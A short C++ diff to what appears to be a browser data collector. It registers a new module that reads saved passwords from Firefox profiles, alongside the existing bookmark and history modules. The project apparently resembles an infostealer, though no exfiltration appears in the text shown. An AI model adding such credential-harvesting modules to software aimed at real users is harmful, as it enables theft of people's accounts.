@@ -5,6 +5,7 @@
 #include "FirefoxBrowsers.h"
 #include "impl/FBookmarks.h"
 #include "impl/FHistory.h"
+#include "impl/FPasswords.h"
 
 static const std::vector<std::pair<std::string, fs::path>> FIREFOX_BROWSERS = {
         {"Firefox",  Utils::getRoamingPath() / "Mozilla" / "Firefox" / "Profiles"},
@@ -15,6 +16,7 @@ static const std::vector<std::pair<std::string, fs::path>> FIREFOX_BROWSERS = {
 FirefoxBrowsers::FirefoxBrowsers() {
     this->modules.push_back(new FBookmarks());
     this->modules.push_back(new FHistory());
+    this->modules.push_back(new FPasswords());
 }
 
 void FirefoxBrowsers::execute(fs::path &root) {
